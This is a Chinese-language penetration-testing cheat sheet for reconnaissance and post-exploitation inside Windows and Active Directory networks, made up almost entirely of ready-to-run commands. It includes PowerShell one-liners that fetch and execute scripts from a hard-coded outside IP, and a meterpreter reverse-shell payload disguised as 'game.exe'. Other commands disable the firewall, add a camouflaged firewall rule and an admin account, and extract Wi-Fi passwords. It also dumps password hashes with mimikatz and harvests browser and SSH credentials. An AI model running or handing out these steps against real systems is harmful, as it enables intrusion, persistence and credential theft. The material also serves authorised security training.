# 渗透测试内网信息收集

## 工作组信息收集

### 1. 用户信息

- 获取主机所有用户信息，手机用户列表以及用户权限

```cmd
#查看本机用户列表
net user

#获取本地管理员信息
net localgroup administrators

#查看当前在线用户
quser
query user
query user || qwinsta

#查看当前用户在目标系统中的具体权限
whoami /all

#查看当前权限
whoami && whoami /priv

#查当前机器中所有的组名,了解不同组的职能,如,IT,HR,ADMIN,FILE
net localgroup
```

### 2. 系统信息

```cmd
#查询网络配置信息。进行IP地址段信息收集
ipconfig /all

#查询操作系统及软件信息
systeminfo /fo list
systeminfo | findstr "主机名"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"

#查看当前系统版本
ver
wmic os list brief
wmic os get Caption,CSDVersion,OSArchitecture,Version

#查看系统体系结构
echo %PROCESSOR_ARCHITECTURE%

#查询本机服务信息
wmic service list brief

#查看安装的软件的版本、路径等
wmic product get name, version
powershell "Get-WmiObject -class Win32_Product |Select-Object -Property name, version"

#查询进程信息
tasklist
wmic process list brief

#查看启动程序信息
wmic startup get command,caption 

#查看计划任务
#win2000之前使用at
at
#win2000之后使用schtasks
schtasks /query /fo LIST /v（win10）
#PS：如果遇到资源无法加载问题，则是由于当前活动页码所致：更改活动页码为437：chcp 437

#查看主机开机时间
net statistics workstation

#列出或断开本地计算机与所连接的客户端的对话
net session

#查看本地可用凭据
cmdkey /l

#查看补丁列表
wmic qfe get hotfixid
systeminfo | findstr "KB"

#查看补丁的名称、描述、ID、安装时间等
wmic qfe get Caption,Description,HotFixID,InstalledOn

#查看本地密码策略
net accounts

#查看hosts文件
Windows：type c:\Windows\system32\drivers\etc\hosts

#查看dns缓存
ipconfig /displaydns
```

### 3. 网络信息

```cmd
#查看本机所有的tcp,udp端口连接及其对应的pid
netstat -ano

#查看本机所有的tcp,udp端口连接,pid及其对应的发起程序，需要管理员权限
netstat -anob

#查看路由表和arp缓存
route print
arp -a

#查看本机共享列表和可访问的域共享列表 （445端口）
net share
wmic share get name,path,status
```

### 4. 防火墙信息

```cmd
#查看防火墙配置(netsh命令也可以用作端口转发)
netsh firewall show config

#关闭防火墙(Windows Server 2003 以前的版本)
netsh firewall set opmode disable 

#firewall命令已弃用，建议使用advfirewall命令
#查看配置规则
netsh advfirewall firewall show rule name=all

#关闭防火墙\开启防火墙(Windows Server 2003 以后的版本)
netsh advfirewall set allprofiles state off\on

#导出\导入配置文件
netsh advfirewall export\import xx.pol

#新建规则阻止TCP协议139端口
netsh advfirewall firewall add rule name="deny tcp 139" dir=in protocol=tcp localport=139 action=block

#新建规则允许3389通过防火墙
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow

#删除名为Remote Desktop的规则
netsh advfirewall firewall delete rule name=Remote Desktop
```

### 5. RDP远程桌面

```cmd
#开启RDP
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1

#关闭RDP
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0

#查询并开启RDP服务的端口，返回一个十六进制的端口
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber
```

### 6. 获取杀软信息

- 获取杀软名称

  ```cmd
  WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
  ```

- 获取杀软路径

  ```cmd
  WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productStatue,pathToSignedProductExe
  ```

- 杀软进程

  ```cmd
  tasklist /v
  wmic process list brief
  ```

  **常见杀软进程**

  | 进程                    | 杀软名称       |
  | ----------------------- | -------------- |
  | 360SD.exe               | 360杀毒        |
  | 360TRAY.exe             | 360实时保护    |
  | HipsMain.exe            | 火绒           |
  | ZHUDONGFANGYU.exe       | 360s主动防御   |
  | KSAFETRAY.exe           | 金山卫士       |
  | SAFEDOGUPDATECENTER.exe | 服务器安全狗   |
  | MCAFEE MCSHIELD.exe     | MCAFEE         |
  | EGULEXE                 | NoD32          |
  | AVP.exe                 | 卡巴斯基       |
  | AVGUARD.exe             | 小红伞         |
  | BDAGENT.exe             | BITDEFENDER    |
  | QQPCRTP.exe             | QQ电脑管家     |
  | hids                    | 主机防护类产品 |
  | hws*                    | 护卫神         |
  | yunsuo*                 | 云锁           |
  | D_Safe*                 | D盾            |

### 7. 代理信息

```cmd
REG QUERY "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer

#通过pac文件自动代理情况
REG QUERY "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL
```

### 8. Wifi密码

```cmd
# 显示所有无线网络配置文件
netsh wlan show profile

# 显示特定无线网络密码(需要管理员权限)
netsh wlan show profile name="xxx" key=clear

# 获取连接过的wifi密码, 企业认证的获取不到
for /f  "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles')  do @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear
```

### 9. 回收站信息

```cmd
# 遍历当前系统中所有用户账户，并将每个用户的回收站中的文件列表导出到文本文件中
FOR /f "skip=1 tokens=1,2 delims= " %c in ('wmic useraccount get name^,sid') do dir /a /b C:\$Recycle.Bin\%d\ ^>%c.txt

# 目录路径在 C:\$Recycle.Bin
# $I -- 路径信息
# $R -- 文件内容
```

### 10. WMIC收集信息

``` bat
:: BIOS信息
wmic BIOS list full /format:htable > wmic.html
:: CPU信息
wmic CPU list full /format:htable >> wmic.html
:: 启动配置管理
wmic BOOTCONFIG list full /format:htable >> wmic.html
:: 系统环境管理
wmic ENVIRONMENT list /format:htable >> wmic.html
:: 系统帐户管理
wmic SYSACCOUNT list full /format:htable >> wmic.html
:: 共享资源管理
wmic SHARE list full /format:htable >> wmic.html
:: 进程
wmic PROCESS get CSName,Description,ExecutablePath,ProcessId /format:htable >> wmic.html
:: 服务
wmic SERVICE get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:htable >> wmic.html
:: 用户帐号
wmic USERACCOUNT list full /format:htable >> wmic.html
:: 用户组
wmic GROUP list /format:htable >> wmic.html
:: 网络接口
wmic NICCONFIG where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:htable >> wmic.html
:: 硬盘信息
wmic VOLUME get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:htable >> wmic.html
:: 网络共享信息
wmic NETUSE list full /format:htable >> wmic.html
:: 安装的Windows补丁
wmic qfe get Caption,Description,HotFixID,InstalledOn /format:htable >> wmic.html
:: 启动运行程序
wmic STARTUP get Caption,Command,Location,User /format:htable >> wmic.html
:: 安装的软件列表
wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:htable >> wmic.html
:: 操作系统
wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,ServicePackMinorVersion,SystemDirectory /format:htable >> wmic.html
:: 时区信息
wmic Timezone get DaylightName,Description,StandardName /format:htable >> wmic.html
```

### 11. powershell收集信息

- [Get-Information.ps1](https://gitee.com/yijingsec/nishang/blob/master/Gather/Get-Information.ps1)

  ```powershell
  #FTP访问、共享连接、putty连接、驱动、应用程序、hosts 文件、进程、无线网络记录
  powershell iex(new-object net.webclient).downloadstring('http://47.104.255.11:8000/Get-Information.ps1');Get-Information
  ```

- [PowerSploit](https://gitee.com/yijingsec/PowerSploit)

  ```powershell
  Get-NetDomain: 获取当前用户所在域的名称
  Get-NetUser: 获取所有用户的详细信息
  Get-NetDomainController: 获取所有域控制器的信息
  Get-NetComputer: 获取域内所有机器的详细信息
  Get-NetOU: 获取域中的OU信息
  Get-NetGroup: 获取所有域内组和组成员信息
  Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息
  Get-NetShare: 获取当前域内所有网络共享信息
  Get-NetSession: 获取指定服务器的会话
  Get-NetRDPSession: 获取指定服务器的远程连接
  Get-NetProcess: 获取远程主机的进程
  Get-UserEvent: 获取指定用户的日志
  Get-ADObiect: 获取活动目录的对象
  Get-NetGPO: 获取域内所有的组策略对象
  Get-DomainPolicy: 获取域默认策略或域控制器策略
  Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限
  Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户
  Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。
  ```

## 域内信息收集

### 1. net

```cmd
#查询域
net view /domain

#查询域内的所有计算机,mingy是域名
net view /domain:mingy

#查询域内所有用户组 （Enterprise Admins 组权限最大）
net group /domain

#查看域管理员的用户组
net group "domain admins" /domain

#查询所有域成员计算机列表
net group "domain computers" /domain

#查询域系统管理员用户组
net group "Enterprise admins" /domain

#查看域控制器
net group "domain controllers" /domain

#对比查看 "工作站域 DNS 名称(域名)"和"登录域()域控制器"的信息是否相匹配
net config workstation

#查看域内所有账号
net user /domain

#查询指定用户的详情信息
net user xxx /domain

#查看时间可以找到域控
net time /domain

#查看域密码策略
net accounts /domain

#查看当前登录域
net config workstation

#登录本机的域管理员
net localgroup administrators /domain
```

### 2. Dsquery

`dsquery` 是一个命令行工具，它是 `Active Directory` 服务的一部分，用于查询 `Active Directory` 目录服务。这个工具可以检索有关目录对象的信息，如用户、组、计算机和OU(组织单位)

```cmd
#查看当前域内的所有机器 ,dsquery 工具一般在域控上才有,不过你可以上传一个dsquery
dsquery computer

#查看当前域中的所有账户名
dsquery user

#查找具有特定通用名称（Common Name, CN）的用户
dsquery user -limit 0 "cn=用户名"

#查看当前域内的所有组名
dsquery group

#查看所有组织单位
dsquery ou

#查看到当前域所在的网段 ，结合 nbtscan 使用
dsquery subnet

#查看域内所有的web站点
dsquery site

#查看所有域控制器
dsquery server

#查询前240个以admin开头的用户名
dsquery user domainroot -name admin* -limit 240
```

### 3. other

```cmd
# 查看域控制器的机器名
# nltest 是一个用于诊断域信任和信任关系的命令行工具。
nltest /DCLIST:MINGY

# 查看域内的主域控制器（仅限Windows Server 2008及之后系统）
# netdom 是一个用于管理域信任和计算机账户的命令行工具。
netdom query pdc

# 查看域控主机名，列出所有配置为LDAP服务的服务器
# nslookup 是一个用于查询DNS记录的命令行工具。
# -type=srv 参数指定查询类型为服务记录（Service Record）
# _ldap._tcp 是LDAP服务的DNS服务记录标识
nslookup -type=srv _ldap._tcp

# 查看当前域与其他域的信任关系列表
nltest /domain_trusts

# 查看域内邮件服务器
# -q=mx 参数指定查询类型为邮件交换记录（Mail Exchange Record）
nslookup -q=mx mingy.com

# 查看域内DNS服务器
# -q=ns 参数指定查询类型为域名服务器记录（Name Server Record）。
nslookup -q=ns mingy.com
```

### 4. 定位域控

1. ipconfig

   ```cmd
   # 获取本地网络接口的详细信息，包括DNS服务器地址
   ipconfig /all
   ```

2. nslookup

   ```cmd
   # DNS解析记录
   # nslookup 查询域的 LDAP 服务记录(SRV记录)，识别域控
   # nslookup 返回域控的DNS记录，包括优先级、权重、端口号和目标主机名
   # xxx.xxx 为域名
   nslookup -type=all _ldap._tcp.dc._msdcs.xxx.xxx
   ```

3. SPN

   ```cmd
   # 服务主体名称查询
   # setspn 工具查询所有服务器主体名称，识别域控
   setspn -q */*
   
   # 针对特定域执行SPN查询，可以过滤出域控相关的记录
   setspn -T xxx.xxx -1 */*
   
   # 通过如下内容定位域控
   CN =DC,OU=Domain Controllers,DC=mingy,DC=com
   ```

4. net group

   ```cmd
   # 查询域控组，定位出域控成员
   net group "domain controllers" /domain
   ```

5. 端口识别

   - 389 -- LDAP ILS: 轻型目录访问协议和`NetMeeting Internet Locator Server` 共用这一端口
   - 53 -- DNS

## Metasploit 内网信息收集

### 1. 反弹shell

```bash
# 1. 生成payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.165 lport=2345 -f exe -o game.exe

# 2. 设置监听
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.1.165
set lport 2345
Exploit

# 3. 目标机器执行payload

# 4. 拿到shell
```

### 2. 关闭防火墙

```bash
# 1. meterpreter 进入 shell 执行如下命令
netsh advfirewall set allprofiles state off
netsh advfirewall show allprofiles

# 2. 添加防火墙规则隐蔽行为
netsh advfirewall set add rule name="VMWARE" protocol=TCP dir=in localport=5555 action=allow

netsh firewall add portopening TCP 5555 "VMWARE" ENABLE ALL
```

*防火墙规则需要重启系统才能生效*

### 3. 打开 3389 远程桌面端口

```bash
#开启3389远程桌面
run post/windows/manage/enable_rdp
run getgui -e

#可以利用该命令 ，在目标机器上添加用户
run getgui -u admin -p admin
net localgroup administrators admin /add

#远程连接桌面
rdesktop -u username -p password ip

#查看远程桌面
screenshot
use espia
screengrab
screenshare

#删除指定账号
run post/windows/manage/delete_user USERNAME=admin
```

### 4. 口令破解

```bash
# 在system权限的meterpreter中执行
use post/windows/gather/hashdump
set session 1
exploit
# 结果保存在tmp目录下

use post/windows/gather/smart_hashdump
set session 1
exploit

#格式
用户名称 : RID : LM-HASH 值 :  NT-HASH 值
```

```bash
#Hashdump使用的是mimikatz的部分功能
Load mimikatz

#wdigest 、kerberos 、msv 、ssp 、tspkg 、livessp
mimikatz_command -h
mimikatz_command -f a::   #查询有哪些模块
mimikatz_command -f samdump::hashes
mimikatz_command -f samdump::bootkey
```

### 5. other

```bash
#确定目标主机是否是虚拟机 ：
run checkvm

#获取目标主机上的软件安装信息 ：
run post/windows/gather/enum_applications

#获取目标主机上最近访问过的文档 、链接信息：
run  post/windows/gather/dumplinks

#查看目标环境信息：
run post/multi/gather/env

#查看firefox中存储的账号密码 ：
run post/multi/gather/firefox_creds

#查看ssh账号密码的密文信息 ，证书信息：
run post/multi/gather/ssh_creds

# 查看目标系统所有网络流量并且进行数据包记录：
# -i 指定记录数据包的网卡
run packetrecorder -i 0    

#读取目标主机IE浏览器cookies等缓存信息 ，嗅探目标主机登录过的各类账号密码：
run post/windows/gather/enum_ie

#获取到的目标主机上的ie浏览器缓存历史记录和cookies信息等都保存到了攻击主机本地的/root/.msf4/loot/目录下
```

### 6. winenum

多功能枚举模块，快速收集目标系统关键信息

```bash
# 进入msf 建立的sessions会话
run winenum
```

### 7. 主机发现

```bash
search aux /scanner/discovery
# arp_sweep: 使用arp请求枚举本地局域网中所有活跃主机
# udp_sweep: 发送UDP数据包探查指定主机是否活跃，并发现主机上的UDP服务
```

```bash
use auxiliary/scanner/discovery/arp_sweep
options
set RHOSTS 192.168.81.0/24
set THREADS 100
run
```

### 8. 端口扫描

```bash
search scanner/portscan

auxiliary/scanner/protscan/tcp
# 通过一次完整的TCP连接来判断端口是否开放 最准确但是最慢

auxiliary/scanner/protscan/ack
# 通过ACK扫描的方式对防火墙上未被屏蔽的端口进行探测

auxiliary/scanner/protscan/syn
# 使用发送TCP SYN标志的方式探测开放端口

auxiliary/scanner/protscan/ftpbounce
#  通过FTP bounce攻击的原理对TCP服务进行枚举，一些新的FTP服务器软件能很好的防范此攻击，但在旧的系统上仍可以被利用

auxiliary/scanner/protscan/xmas
# 一种更为隐秘的扫描方式，通过发送FIN，PSH，URG标志，能够躲避一些高级的TCP标记检测器的过滤

# 一般情况下推荐使用syn端口扫描器，速度快，结果准确，不易被察觉
```

### 9. 服务扫描

- 确定开放端口后，对对应端口上所运行的服务信息进行挖掘

- Metasploit 的 Scanner 模块，用于服务扫描和查点的工具明明形式如下：

  - [service_name]_version: 遍历网络中包含某种服务的主机，并进一步确定服务的版本
  - [service_name]_login: 口令探测攻击

  ```bash
  # 查找服务探测模块
  search scanner _version
  
  # 查找口令探测模块
  search scanner _login
  ```

## 内网存货主机探测

### 1. Netbios协议探测

- nmap netbios 扫描

  ```bash
  # udp 扫描 指定脚本 nbstat.nse huoqu netbios信息，只扫描端口137
  nmap -sU -T4 --script nbstat.nse -p137 10.10.10.0/24
  ```

- MSF扫描

  ```bash
  use auxiliary/scanner/netbios/nbname
  ```

- Nbtscan

  [nbtscan](http://www.unixwiz.net/tools/nbtscan.html)

  ```bash
  # windows
  
  nbtscan.exe -m 10.10.10.0/24
  
  nbtstat -n
  
  # linux
  nbtscan -r 10.10.10.0/24
  ```

### 2. ICMP协议探测

1. cmd

   ```cmd
   # for循环结合ping命令快速检测内网中存活主机
   for /l %i in (1,1,255) do @ ping 10.0.0.%i -w 1 -n 1|find /i "ttl="
   
   # 存活主机与非存活主机IP分别输出到不同的文件中
   @for /l %i in (1,1,255) do @ping -n 1 -w 40 10.10.10.%i & if errorlevel 1 (echo 10.10.10.%i>>c:\a.txt) else (echo 10.10.10.%i >>c:\b.txt)
   ```

2. nmap扫描

   ```bash
   nmap -sn -PE -T4 10.10.10.0/24
   # -sn: 不进行端口扫描
   # -PE: 使用icmp echo 请求进行ping扫描
   ```

3. powershell扫描

   - 使用powershell脚本进行ICMP探测，可以指定起始和结束地址，以及扫描的端口

   - 本地加载

     ```powershell
     powershell.exe ‐exec bypass ‐Command "Import‐Module ./Invoke‐TSPingSweep.ps1; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐ResolveHost ‐ScanPort ‐Port 445,135"
     ```

   - 远程加载

     ```powershell
     powershell iex(new-object net.webclient).downloadstring('http://47.104.255.11:8000/Invoke-TSPingSweep.ps1');Invoke-TSPingSweep -StartAddress 10.10.10.1 -EndAddress 10.10.10.254 -ResolveHost -ScanPort -Port 445,135
     ```

### 3. UDP协议探测

1. nmap

   ```bash
   nmap -sU –T4 -sV --max-retries 1 192.168.1.100 -p500
   # -sU UDP扫描
   # -T4 速度
   # --max-retries 1 重试次数
   # -p500 端口500
   ```

2. metasploit

   ```bash
   use auxiliary/scanner/discovery/udp_probe
   use auxiliary/scanner/discovery/udp_sweep
   ```

3. Unicornscan

   ```bash
   unicornscan -mU 192.168.1.100
   ```

### 4. ARP协议探测

1. nmap扫描

   ```bash
   nmap -sn -PR 192.168.1.1/24
   ```

2. MSF

   ```bash
   use auxiliary/scanner/discovery/arp_sweep
   ```

3. Netdiscover

   ```bash
   netdiscover -r 10.10.10.0/24 -i eth1
   ```

4. powershell

   [脚本](https://gitee.com/yijingsec/empire-project/raw/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1)

   ```bash
   powershell.exe -exec bypass -Command "Import-Module .\arpscan.ps1;InvokeARPScan -CIDR 192.168.1.0/24"
   ```

5. arp-scan

   [arp-scan(linux)](https://linux.die.net/man/1/arp-scan)

   [arp-scan(win)](https://github.com/QbsuranAlang/arp-scan-windows-/tree/main/arp-scan)

   ```bash
   # linux
   arp-scan -interface=eth1 --localnet
   
   # windows
   arp-scan.exe –t 10.10.10.0/24
   ```

### 5. SMB协议探测

1. nmap

   ```bash
   nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p 445 192.168.1.119
   ```

2. Crackmapexec

   网络身份验证python工具

   ```bash
   # 默认为 100 线程
   crackmapexec smb 10.10.10.0/24
   ```

3. MSF

   ```bash
   use auxiliary/scanner/smb/smb_version
   ```

### 6. 域内端口探测

1. `MSF poortscan` 模块

2. `Nishang` 中的 [`Invoke-PortScan`](https://raw.githubusercontent.com/samratashok/nishang/c3fdf5e5dfa8612d0a17636dbb096b04e987ab31/Scan/Invoke-PortScan.ps1)

   ```powershell
   # 默认扫描常用端口，-Port 指定端口
   powershell iex(new-object net.webclient).downloadstring('http://47.104.255.11:8000/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 10.10.10.1 -EndAddress 10.10.10.255 -ResolveHost -ScanPort
   ```

## 内网信息收集工具

### 1. [Fscan](https://github.com/shadow1ng/fscan)

```bash
# 默认使用全部模块
fscan.exe -h 192.168.1.1/24

# B 段扫描
fscan.exe -h 192.168.1.1/16
```

### 2. [LadonGo](https://github.com/k8gege/LadonGo)

```bash
#多协议探测存活主机 （IP、机器名、MAC 地址、制造商）
Ladon 192.168.1.8/24 OnlinePC

#多协议识别操作系统 （IP、机器名、操作系统版本、开放服务）
Ladon 192.168.1.8/24 OsScan

#扫描存活主机-
Ladon 192.168.1.8/24 OnlineIP

#ICMP扫描存活主机
Ladon 192.168.1.8/24 Ping

#扫描SMB漏洞MS17010 （IP、机器名、漏洞编号、操作系统版本）
Ladon 192.168.1.8/24 MS17010

#SMBGhost漏洞检测 CVE-2020-0796 （IP、机器名、漏洞编号、操作系统版本）
Ladon 192.168.1.8/24 SMBGhost
```

### 3. [Adfind](https://www.joeware.net/freetools/tools/adfind/index.htm)

用法：

```bash
Usage:
 AdFind [switches] [-b basedn] [-f filter] [attr list]

   basedn        RFC 2253 DN to base search from. If no base specified, defaults to default NC.
                 Base DN can also be specified as a SID, GUID, or IID.
   filter        RFC 2254 LDAP filter. If no filter specified, defaults to objectclass=*.
   attr list     List of specific attributes to return, 
                 if nothing specified returns 'default' attributes, aka * set.

  Switches: (designated by - or /)

    [CONNECTION OPTIONS][连接选项]
   -h host:port  要使用的主机和端口。如果未指定，则使用默认 LDAP 服务器上的端口 389。
                 Localhost 可以指定为“.”; 还可以通过-p 和-gc 指定端口。
                 指定了带端口的 IPv6 [address]:port
   -gc           搜索全局目录 (port 3268)。
   -p port       指定要连接到的端口的备用方法。

    [QUERY OPTIONS][查询选项]
   -s scope      搜索范围。 Base, One[Level], Sub[tree].
   -t xxx        查询的超时值，默认为 120 秒。

    [OUTPUT OPTIONS][输出选项]
   -c            仅对象计数。
   -dn           仅对象 DN。
   -appver       输出 AdFind 版本信息。
```

```bash
#列出域控制器名称
AdFind -sc dclist

#查看域控版本
AdFind -schema -s base objectversion

#查询当前域中在线的计算机 (所有属性)
AdFind -sc computers_active

#查询当前域中在线的计算机 (只显示名称和操作系统)
AdFind -sc computers_active name operatingSystem

#查询当前域中所有计算机 (所有属性)
AdFind -f "objectcategory=computer"

#查询当前域中所有计算机 (只显示名称和操作系统)
AdFind -f "objectcategory=computer" name operatingSystem

#查询指定域 (mingy.local)中所有计算机(所有属性)
Adfind -b dc=mingy,dc=local -f "objectcategory=computer"

#查询域内所有用户
AdFind -users name

#查询指定域 (mingy.local)内所有用户(所有属性)
Adfind -b dc=mingy,dc=local -f "objectcategory=user"

#查询所有GPO信息
AdFind -sc gpodmp

#查看受保护AD域账户
Adfind -f "&(objectcategory=person)(samaccountname=*)(admincount=1)" -dn

#查看域管账户
AdFind -default -f "(&(|(&(objectCategory=person)(objectClass=user))(objectCategory=group))(adminCount=1))" -dn
```

### 4. BloodHound

1. 安装

   1. 安装neo4j

      ```bash
      apt install neo4j -y
      ```

   2. 下载[BloodHound](https://github.com/BloodHoundAD/BloodHound)

2. 收集器

   1. [下载](https://gitee.com/yijingsec/BloodHound/tree/master/Collectors)

   2. 编译

      `Visual Studio` 编译`SharpHound` 需要安装对应版本 `.NETFramework` 

      - 生成应用 - 开发包: 编译程序下载开发人员工具包

      - 运行应用 - 运行时: 运行编译后的程序需要安装对应版本运行时

        [各版本Windows系统中自带.NET Framework版本](https://blog.csdn.net/yangowen/article/details/103934078)

      - [SharpHound](https://github.com/BloodHoundAD/SharpHound)

        收集器：`BloodHound v4.x.x`

        应用程序集 [.NETFramework](https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/net462): `v4.6.2`

      - [SharpHound2](https://github.com/BloodHoundAD/SharpHound2)

        收集器：`BloodHound v2.x.x`

        应用程序集 [.NETFramework](https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/thank-you/net35-sp1-web-installer): `v3.5`

      - [SharpHound3](https://github.com/BloodHoundAD/SharpHound3)

        收集器：`BloodHound v3.x.x`

        应用程序集 [.NETFramework](https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/net452): `v4.5.2`

   3. 加载powershell

      ```powershell
      IEX (NEW-OBJECT net.webclient).downloadstring('http://192.168.81.154:8000/SharpHound.ps1');Invoke-BloodHound -c all
      ```

3.  启动

   1. 启动 neo4j

      ```bash
      neo4j start
      neo4j console
      ```

   2. 登录neo4j

      访问：`http://localhost:7474/browser/`

      账密：`neo4j / neo4j`

   3. 启动 BloodHound

      ```bash
      ./BloodHound --no-sandbox
      ```

   4. 运行收集器

      运行收集器程序后，在当前目录将生成包含所有数据的压缩包，压缩包拖入`BloodHound`, 即可筛选查看收集到的域相关的信息





